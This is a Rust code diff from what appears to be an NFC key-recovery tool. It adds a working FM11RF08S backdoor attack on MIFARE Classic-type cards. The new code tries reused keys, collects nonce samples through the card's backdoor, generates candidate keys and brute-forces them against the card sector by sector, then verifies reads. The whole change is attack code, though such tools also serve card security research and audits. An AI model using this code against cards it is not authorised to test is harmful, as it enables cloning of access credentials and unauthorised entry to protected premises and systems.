@@ -17,6 +17,7 @@ use crate::classify;
 use crate::darkside;
 use crate::hardnested::{self, HardnestedEvent, HardnestedRequest};
 use crate::nested::{self, NestedRequest};
+use crate::staticnested;
 
 /// Darkside probes attempted before the seed acquisition gives up. Each probe
 /// reselects the card, so cancellation and the attempt cap stay responsive.
@@ -278,17 +279,16 @@ fn auto(reader: &mut dyn Reader, request: &RecoveryRequest) -> Result<RecoveryRe
                 }
             };
         if static_encrypted {
-            notes.push(static_encrypted_message().to_string());
-        } else {
-            recover_missing(
-                reader,
-                layout,
-                request,
-                &mut found,
-                &mut attempts,
-                &mut notes,
-            )?;
+            return fm11rf08s_attack(reader, request);
         }
+        recover_missing(
+            reader,
+            layout,
+            request,
+            &mut found,
+            &mut attempts,
+            &mut notes,
+        )?;
     }
 
     // 5. Read every recovered sector with its verified key.
@@ -797,25 +797,156 @@ fn hardnested_attack_with(
 }
 
 fn fm11rf08s_attack(reader: &mut dyn Reader, request: &RecoveryRequest) -> Result<RecoveryResult> {
-    let Some((key_type, key)) = find_known_key(reader, request)? else {
-        return Err(NfcError::InvalidArgument(
-            "static encrypted nonce detection needs a candidate key that authenticates the known block"
-                .to_owned(),
-        ));
-    };
-    if classify::detect_static_encrypted(reader, request.known_block, key_type, key)? {
-        Err(static_encrypted_message())
-    } else {
-        Err(NfcError::InvalidArgument(
-            "the card does not return a static encrypted nonce; use nested or hardnested recovery"
-                .to_owned(),
-        ))
+    let card = reader.card_info()?;
+    let layout = classic_layout(&card)?;
+    let sector_count = layout.sector_count();
+    let mut found: Vec<RecoveredKey> = Vec::new();
+    let mut notes = Vec::new();
+
+    for sector in 0..sector_count {
+        let first_block = layout.first_block(sector)? as u8;
+        for key_type in [KeyType::A, KeyType::B] {
+            request.cancel.check()?;
+            if found
+                .iter()
+                .any(|entry| entry.sector == sector && entry.key_type == key_type)
+            {
+                continue;
+            }
+            emit(
+                request,
+                RecoveryProgress::Sector {
+                    sector,
+                    sector_count,
+                    hardnested: false,
+                },
+            );
+
+            // Reused keys are common. Try every key already known or supplied
+            // before generating a candidate set.
+            if let Some(key) = find_reusable_key(reader, request, first_block, key_type, &found)? {
+                push_found(&mut found, sector, key_type, key, AttackKind::Fm11rf08s);
+                continue;
+            }
+
+            let sample = match staticnested::collect_sample_backdoor(reader, first_block, key_type)
+            {
+                Ok(sample) => sample,
+                Err(error) => {
+                    notes.push(format!(
+                        "sector {sector} key {}: backdoor acquisition failed: {error}",
+                        key_type.label()
+                    ));
+                    continue;
+                }
+            };
+            let candidates = staticnested::candidates(&sample);
+            let candidate_count = candidates.len();
+            let mut recovered = None;
+            for (index, key) in candidates.into_iter().enumerate() {
+                request.cancel.check()?;
+                if index.is_multiple_of(1024) {
+                    emit(
+                        request,
+                        RecoveryProgress::BruteForce {
+                            tested_states: index as u64,
+                            total_states: candidate_count as u64,
+                            expected_states: candidate_count as f64,
+                        },
+                    );
+                }
+                match nested::verify_key(reader, first_block, key_type, key) {
+                    Ok(()) => {
+                        recovered = Some(key);
+                        break;
+                    }
+                    Err(error) if fatal(&error) => return Err(error),
+                    Err(_) => {}
+                }
+            }
+            match recovered {
+                Some(key) => {
+                    push_found(&mut found, sector, key_type, key, AttackKind::Fm11rf08s);
+                    notes.push(format!(
+                        "sector {sector} key {}: recovered from {candidate_count} candidates",
+                        key_type.label()
+                    ));
+                }
+                None => notes.push(format!(
+                    "sector {sector} key {}: no candidate verified",
+                    key_type.label()
+                )),
+            }
+        }
     }
+
+    if found.is_empty() {
+        return Err(static_encrypted_message());
+    }
+    let readable = verify_reads(reader, layout, request, &found, &mut notes)?;
+    let mut keys: Vec<(KeyType, Key)> = Vec::new();
+    for entry in &found {
+        let candidate = (entry.key_type, entry.key);
+        if !keys.contains(&candidate) {
+            keys.push(candidate);
+        }
+    }
+    let mut note = format!(
+        "FM11RF08S backdoor · sector keys {}/{} · read verification {}/{} sectors",
+        found.len(),
+        sector_count * 2,
+        readable,
+        sector_count
+    );
+    for entry in &notes {
+        note.push_str(" · ");
+        note.push_str(entry);
+    }
+    Ok(RecoveryResult {
+        card: None,
+        keys,
+        sector_keys: found,
+        attempts: vec![AttackKind::Fm11rf08s],
+        profile: Some(CardProfile {
+            prng: crate::auto::PrngProfile::StaticEncrypted,
+            ..CardProfile::default()
+        }),
+        note,
+    })
+}
+
+fn find_reusable_key(
+    reader: &mut dyn Reader,
+    request: &RecoveryRequest,
+    block: u8,
+    key_type: KeyType,
+    found: &[RecoveredKey],
+) -> Result<Option<Key>> {
+    let mut keys: Vec<Key> = Vec::new();
+    for (_, key) in &request.candidates {
+        if !keys.contains(key) {
+            keys.push(*key);
+        }
+    }
+    for entry in found {
+        if !keys.contains(&entry.key) {
+            keys.push(entry.key);
+        }
+    }
+    for key in keys {
+        request.cancel.check()?;
+        match nested::verify_key(reader, block, key_type, key) {
+            Ok(()) => return Ok(Some(key)),
+            Err(error) if fatal(&error) => return Err(error),
+            Err(_) => {}
+        }
+    }
+    Ok(None)
 }
 
 fn static_encrypted_message() -> NfcError {
     NfcError::Unsupported(
-        "static encrypted nonce card detected (FM11RF08S profile); recovery needs the reader-scheduled FM11RF08S acquisition, which this transport does not expose",
+        "the FM11RF08S backdoor did not answer and no candidate key authenticated the card",
     )
 }
 
